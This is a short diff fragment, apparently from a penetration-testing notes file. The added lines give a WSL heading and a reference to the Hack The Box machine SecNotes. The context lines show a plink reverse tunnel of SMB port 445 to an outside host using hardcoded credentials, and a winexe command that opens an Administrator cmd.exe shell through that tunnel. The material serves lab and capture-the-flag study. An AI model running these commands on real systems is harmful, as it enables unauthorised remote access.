@@ -151,3 +151,7 @@ TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4
 >> plink.exe -l root -pw toor -R 445:127.0.0.1:445 10.10.14.51 -v
 >>> winexe -U Administrator%Welcome1 //127.0.0.1 "cmd.exe"
 ```
+
+#### WSL (Windows Subsystem for Linux)
+
+Hack The Box: SecNotes
